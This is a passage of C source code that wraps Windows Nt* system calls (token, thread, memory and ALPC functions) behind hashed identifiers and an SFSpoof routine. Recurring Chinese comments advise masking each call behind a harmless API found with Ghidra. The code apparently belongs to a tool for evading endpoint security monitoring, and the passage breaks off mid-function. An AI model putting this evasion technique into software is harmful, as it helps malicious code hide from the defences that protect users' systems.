NTSTATUS SFNtAdjustTokenClaimsAndDeviceGroups(HANDLE TokenHandle, BOOLEAN UserResetToDefault, BOOLEAN DeviceResetToDefault, BOOLEAN DeviceGroupsResetToDefault, PTOKEN_SECURITY_ATTRIBUTES_INFORMATION NewUserState, PTOKEN_SECURITY_ATTRIBUTES_INFORMATION NewDeviceState, PTOKEN_GROUPS NewDeviceGroupsState, ULONG UserBufferLength, PTOKEN_SECURITY_ATTRIBUTES_INFORMATION PreviousUserState, ULONG DeviceBufferLength, PTOKEN_SECURITY_ATTRIBUTES_INFORMATION PreviousDeviceState, ULONG DeviceGroupsBufferLength, PTOKEN_GROUPS PreviousDeviceGroups, PULONG UserReturnLength, PULONG DeviceReturnLength, PULONG DeviceGroupsReturnBufferLength) {
    Params.param[1] = (DWORD_PTR)TokenHandle;
    Params.param[2] = (DWORD_PTR)UserResetToDefault;
    Params.param[3] = (DWORD_PTR)DeviceResetToDefault;
    Params.param[4] = (DWORD_PTR)DeviceGroupsResetToDefault;
    Params.param[5] = (DWORD_PTR)NewUserState;
    Params.param[6] = (DWORD_PTR)NewDeviceState;
    Params.param[7] = (DWORD_PTR)NewDeviceGroupsState;
    Params.param[8] = (DWORD_PTR)UserBufferLength;
    Params.param[9] = (DWORD_PTR)PreviousUserState;
    Params.param[10] = (DWORD_PTR)DeviceBufferLength;
    Params.param[11] = (DWORD_PTR)PreviousDeviceState;
    Params.param[12] = (DWORD_PTR)DeviceGroupsBufferLength;
    Params.param[13] = (DWORD_PTR)PreviousDeviceGroups;
    Params.param[14] = (DWORD_PTR)UserReturnLength;
    Params.param[15] = (DWORD_PTR)DeviceReturnLength;
    Params.param[16] = (DWORD_PTR)DeviceGroupsReturnBufferLength;
    Params.param[17] = 0;
    Params.ParamNum = 16;
    Params.FuncHash = 0x005CD615F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlertResumeThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)PreviousSuspendCount;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0A00EA697;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlertThread(HANDLE ThreadHandle) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0CAEC4BC6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlertThreadByThreadId(ULONG ThreadId) {
    Params.param[1] = (DWORD_PTR)ThreadId;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x00F1271D1;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAllocateLocallyUniqueId(PLUID Luid) {
    Params.param[1] = (DWORD_PTR)Luid;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x02795637C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAllocateReserveObject(PHANDLE MemoryReserveHandle, POBJECT_ATTRIBUTES ObjectAttributes, MEMORY_RESERVE_TYPE Type) {
    Params.param[1] = (DWORD_PTR)MemoryReserveHandle;
    Params.param[2] = (DWORD_PTR)ObjectAttributes;
    Params.param[3] = (DWORD_PTR)Type;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x02E17AE0B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAllocateUserPhysicalPages(HANDLE ProcessHandle, PULONG NumberOfPages, PULONG UserPfnArray) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)NumberOfPages;
    Params.param[3] = (DWORD_PTR)UserPfnArray;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x063C10C22;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAllocateUuids(PLARGE_INTEGER Time, PULONG Range, PULONG Sequence, PUCHAR Seed) {
    Params.param[1] = (DWORD_PTR)Time;
    Params.param[2] = (DWORD_PTR)Range;
    Params.param[3] = (DWORD_PTR)Sequence;
    Params.param[4] = (DWORD_PTR)Seed;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0799F7707;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAllocateVirtualMemoryEx(HANDLE ProcessHandle, PPVOID lpAddress, DWORD_PTR ZeroBits, PSIZE_T pSize, ULONG flAllocationType, PVOID DataBuffer, ULONG DataCount) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)lpAddress;
    Params.param[3] = (DWORD_PTR)ZeroBits;
    Params.param[4] = (DWORD_PTR)pSize;
    Params.param[5] = (DWORD_PTR)flAllocationType;
    Params.param[6] = (DWORD_PTR)DataBuffer;
    Params.param[7] = (DWORD_PTR)DataCount;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 7;
    Params.FuncHash = 0x0E4673932;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcAcceptConnectPort(PHANDLE PortHandle, HANDLE ConnectionPortHandle, ULONG Flags, POBJECT_ATTRIBUTES ObjectAttributes, PALPC_PORT_ATTRIBUTES PortAttributes, PVOID PortContext, PPORT_MESSAGE ConnectionRequest, PALPC_MESSAGE_ATTRIBUTES ConnectionMessageAttributes, BOOLEAN AcceptConnection) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)ConnectionPortHandle;
    Params.param[3] = (DWORD_PTR)Flags;
    Params.param[4] = (DWORD_PTR)ObjectAttributes;
    Params.param[5] = (DWORD_PTR)PortAttributes;
    Params.param[6] = (DWORD_PTR)PortContext;
    Params.param[7] = (DWORD_PTR)ConnectionRequest;
    Params.param[8] = (DWORD_PTR)ConnectionMessageAttributes;
    Params.param[9] = (DWORD_PTR)AcceptConnection;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x07EA1612A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcCancelMessage(HANDLE PortHandle, ULONG Flags, PALPC_CONTEXT_ATTR MessageContext) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)MessageContext;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x01A1DDE44;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcConnectPort(PHANDLE PortHandle, PUNICODE_STRING PortName, POBJECT_ATTRIBUTES ObjectAttributes, PALPC_PORT_ATTRIBUTES PortAttributes, ULONG Flags, PSID RequiredServerSid, PPORT_MESSAGE ConnectionMessage, PULONG BufferLength, PALPC_MESSAGE_ATTRIBUTES OutMessageAttributes, PALPC_MESSAGE_ATTRIBUTES InMessageAttributes, PLARGE_INTEGER Timeout) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)PortName;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)PortAttributes;
    Params.param[5] = (DWORD_PTR)Flags;
    Params.param[6] = (DWORD_PTR)RequiredServerSid;
    Params.param[7] = (DWORD_PTR)ConnectionMessage;
    Params.param[8] = (DWORD_PTR)BufferLength;
    Params.param[9] = (DWORD_PTR)OutMessageAttributes;
    Params.param[10] = (DWORD_PTR)InMessageAttributes;
    Params.param[11] = (DWORD_PTR)Timeout;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 11;
    Params.FuncHash = 0x016813D1E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcConnectPortEx(PHANDLE PortHandle, POBJECT_ATTRIBUTES ConnectionPortObjectAttributes, POBJECT_ATTRIBUTES ClientPortObjectAttributes, PALPC_PORT_ATTRIBUTES PortAttributes, ULONG Flags, PSECURITY_DESCRIPTOR ServerSecurityRequirements, PPORT_MESSAGE ConnectionMessage, PSIZE_T BufferLength, PALPC_MESSAGE_ATTRIBUTES OutMessageAttributes, PALPC_MESSAGE_ATTRIBUTES InMessageAttributes, PLARGE_INTEGER Timeout) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)ConnectionPortObjectAttributes;
    Params.param[3] = (DWORD_PTR)ClientPortObjectAttributes;
    Params.param[4] = (DWORD_PTR)PortAttributes;
    Params.param[5] = (DWORD_PTR)Flags;
    Params.param[6] = (DWORD_PTR)ServerSecurityRequirements;
    Params.param[7] = (DWORD_PTR)ConnectionMessage;
    Params.param[8] = (DWORD_PTR)BufferLength;
    Params.param[9] = (DWORD_PTR)OutMessageAttributes;
    Params.param[10] = (DWORD_PTR)InMessageAttributes;
    Params.param[11] = (DWORD_PTR)Timeout;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 11;
    Params.FuncHash = 0x0139FADA9;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcCreatePort(PHANDLE PortHandle, POBJECT_ATTRIBUTES ObjectAttributes, PALPC_PORT_ATTRIBUTES PortAttributes) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)ObjectAttributes;
    Params.param[3] = (DWORD_PTR)PortAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0F0B07BAE;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcCreatePortSection(HANDLE PortHandle, ULONG Flags, HANDLE SectionHandle, SIZE_T SectionSize, PHANDLE AlpcSectionHandle, PSIZE_T ActualSectionSize) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)SectionHandle;
    Params.param[4] = (DWORD_PTR)SectionSize;
    Params.param[5] = (DWORD_PTR)AlpcSectionHandle;
    Params.param[6] = (DWORD_PTR)ActualSectionSize;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x074D61BCB;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcCreateResourceReserve(HANDLE PortHandle, ULONG Flags, SIZE_T MessageSize, PHANDLE ResourceId) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)MessageSize;
    Params.param[4] = (DWORD_PTR)ResourceId;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x036BA2637;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcCreateSectionView(HANDLE PortHandle, ULONG Flags, PALPC_DATA_VIEW_ATTR ViewAttributes) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)ViewAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0F4ABF335;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcCreateSecurityContext(HANDLE PortHandle, ULONG Flags, PALPC_SECURITY_ATTR SecurityAttribute) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)SecurityAttribute;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0164F1ACF;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcDeletePortSection(HANDLE PortHandle, ULONG Flags, HANDLE SectionHandle) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)SectionHandle;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x070695EF5;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcDeleteResourceReserve(HANDLE PortHandle, ULONG Flags, HANDLE ResourceId) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)ResourceId;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x046ED6C61;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcDeleteSectionView(HANDLE PortHandle, ULONG Flags, PVOID ViewBase) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)ViewBase;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x054ED7373;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcDeleteSecurityContext(HANDLE PortHandle, ULONG Flags, HANDLE ContextHandle) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)ContextHandle;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0FF3AEAB3;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcDisconnectPort(HANDLE PortHandle, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0A4F2419C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcImpersonateClientContainerOfPort(HANDLE PortHandle, PPORT_MESSAGE Message, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Message;
    Params.param[3] = (DWORD_PTR)Flags;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x09EF672A5;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcImpersonateClientOfPort(HANDLE PortHandle, PPORT_MESSAGE Message, PVOID Flags) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Message;
    Params.param[3] = (DWORD_PTR)Flags;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0E4B5C16D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcOpenSenderProcess(PHANDLE ProcessHandle, HANDLE PortHandle, PPORT_MESSAGE PortMessage, ULONG Flags, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)PortHandle;
    Params.param[3] = (DWORD_PTR)PortMessage;
    Params.param[4] = (DWORD_PTR)Flags;
    Params.param[5] = (DWORD_PTR)DesiredAccess;
    Params.param[6] = (DWORD_PTR)ObjectAttributes;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x03D97320C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcOpenSenderThread(PHANDLE ThreadHandle, HANDLE PortHandle, PPORT_MESSAGE PortMessage, ULONG Flags, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)PortHandle;
    Params.param[3] = (DWORD_PTR)PortMessage;
    Params.param[4] = (DWORD_PTR)Flags;
    Params.param[5] = (DWORD_PTR)DesiredAccess;
    Params.param[6] = (DWORD_PTR)ObjectAttributes;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x06EC8320B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcQueryInformation(HANDLE PortHandle, ALPC_PORT_INFORMATION_CLASS PortInformationClass, PVOID PortInformation, ULONG Length, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)PortInformationClass;
    Params.param[3] = (DWORD_PTR)PortInformation;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x08E5FC88B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcQueryInformationMessage(HANDLE PortHandle, PPORT_MESSAGE PortMessage, ALPC_MESSAGE_INFORMATION_CLASS MessageInformationClass, PVOID MessageInformation, ULONG Length, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)PortMessage;
    Params.param[3] = (DWORD_PTR)MessageInformationClass;
    Params.param[4] = (DWORD_PTR)MessageInformation;
    Params.param[5] = (DWORD_PTR)Length;
    Params.param[6] = (DWORD_PTR)ReturnLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0AD9CA03A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcRevokeSecurityContext(HANDLE PortHandle, ULONG Flags, HANDLE ContextHandle) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)ContextHandle;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0F56AE68D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAlpcSendWaitReceivePort(HANDLE PortHandle, ULONG Flags, PPORT_MESSAGE SendMessage, PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes, PPORT_MESSAGE ReceiveMessage, PSIZE_T BufferLength, PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes, PLARGE_INTEGER Timeout) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)SendMessage;
    Params.param[4] = (DWORD_PTR)SendMessageAttributes;
